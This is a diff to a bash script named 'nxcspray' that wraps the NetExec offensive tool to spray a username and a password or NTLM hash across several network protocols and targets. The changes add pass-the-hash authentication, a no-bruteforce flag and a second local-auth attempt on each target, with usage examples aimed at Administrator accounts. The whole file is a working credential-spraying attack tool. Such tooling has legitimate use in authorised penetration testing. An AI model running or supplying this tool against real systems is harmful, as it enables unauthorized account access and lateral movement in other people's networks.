@@ -1,15 +1,29 @@
 #!/bin/bash
 
+# Spray credentials across NetExec (nxc) protocols. Requires `nxc` on PATH
+# (NetExec is commonly installed on Kali and other offensive-security distros).
+#
 # Usage:
-#   nxcspray <protocols|all> <targets> -u <username> -p <password>
+#   nxcspray <protocols|all> <targets> -u <username> -p <password> [-N|--no-bruteforce]
+#   nxcspray <protocols|all> <targets> -u <username> -H <lm:nt|nt_hash> [-N|--no-bruteforce]
+#
+# Use either -p (password) or -H (NTLM hash), not both.
+#
+# Optional: -N or --no-bruteforce appends nxc's --no-bruteforce to each run (see NetExec
+# docs; commonly used with user/password files for one-to-one pairing instead of full combinatorics).
 #
 # Examples:
 #   nxcspray all 10.10.10.10 -u bob -p password
-#   nxcspray smb,ldap,winrm hosts.txt -u bob -p password
+#   nxcspray smb,ldap,winrm hosts.txt -u bob -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30a0e5adb2efe0ecd
+#   nxcspray rdp 10.0.0.5 -u Administrator -H 5fbc3d5fec8206a30a0e5adb2efe0ecd
+#   nxcspray smb 10.0.0.5 -u Administrator -p secret --no-bruteforce
+#
+# Each protocol/target is tried without nxc's --local-auth, then again with
+# --local-auth where supported (ldap and ssh omit the second pass).
 
 # ---- Argument Validation ----
 if [ "$#" -lt 4 ]; then
-    echo "[-] Usage: $0 <protocols|all> <targets> -u <username> -p <password>"
+    echo "[-] Usage: $0 <protocols|all> <targets> -u <username> (-p <password> | -H <ntlm_hash>) [-N|--no-bruteforce]"
     exit 1
 fi
 
@@ -17,13 +31,32 @@ PROTOS_RAW="$1"
 TARGETS_RAW="$2"
 shift 2
 
+NO_BRUTEFORCE=false
+REMAINING=()
+while [ $# -gt 0 ]; do
+    case "$1" in
+        --no-bruteforce)
+            NO_BRUTEFORCE=true
+            shift
+            ;;
+        *)
+            REMAINING+=("$1")
+            shift
+            ;;
+    esac
+done
+set -- "${REMAINING[@]}"
+
 USER=""
 PASS=""
+HASH=""
 
-while getopts "u:p:" opt; do
+while getopts "u:p:H:N" opt; do
     case $opt in
         u) USER="$OPTARG" ;;
         p) PASS="$OPTARG" ;;
+        H) HASH="$OPTARG" ;;
+        N) NO_BRUTEFORCE=true ;;
         *)
             echo "[-] Invalid flag"
             exit 1
@@ -31,9 +64,30 @@ while getopts "u:p:" opt; do
     esac
 done
 
-if [ -z "$USER" ] || [ -z "$PASS" ]; then
-    echo "[-] Missing required flags: -u <username> -p <password>"
+EXTRA_NXC=()
+if [ "$NO_BRUTEFORCE" = true ]; then
+    EXTRA_NXC+=(--no-bruteforce)
+fi
+
+if [ -z "$USER" ]; then
+    echo "[-] Missing required flag: -u <username>"
     exit 1
+fi
+
+if [ -n "$PASS" ] && [ -n "$HASH" ]; then
+    echo "[-] Use only one of -p <password> or -H <ntlm_hash>, not both"
+    exit 1
+fi
+
+if [ -z "$PASS" ] && [ -z "$HASH" ]; then
+    echo "[-] Missing credentials: provide -p <password> or -H <ntlm_hash>"
+    exit 1
+fi
+
+if [ -n "$HASH" ]; then
+    AUTH_MODE="hash"
+else
+    AUTH_MODE="password"
 fi
 
 # ---- Protocol Handling ----
@@ -56,6 +110,24 @@ for PROTO in "${PROTO_ARRAY[@]}"; do
 
     for TARGET in $TARGETS; do
         echo "    -> Target: $TARGET"
-        nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS"
+
+        if [ "$AUTH_MODE" = "hash" ] && [ "$PROTO" = "ssh" ]; then
+            echo "    [!] Skipping: ssh does not use NTLM hash authentication"
+            continue
+        fi
+
+        run_nxc() {
+            if [ "$AUTH_MODE" = "password" ]; then
+                nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" "${EXTRA_NXC[@]}" "$@"
+            else
+                nxc "$PROTO" "$TARGET" -u "$USER" -H "$HASH" "${EXTRA_NXC[@]}" "$@"
+            fi
+        }
+
+        run_nxc
+        if [ "$PROTO" != "ldap" ] && [ "$PROTO" != "ssh" ]; then
+            echo "    -> (local-auth)"
+            run_nxc --local-auth
+        fi
     done
 done
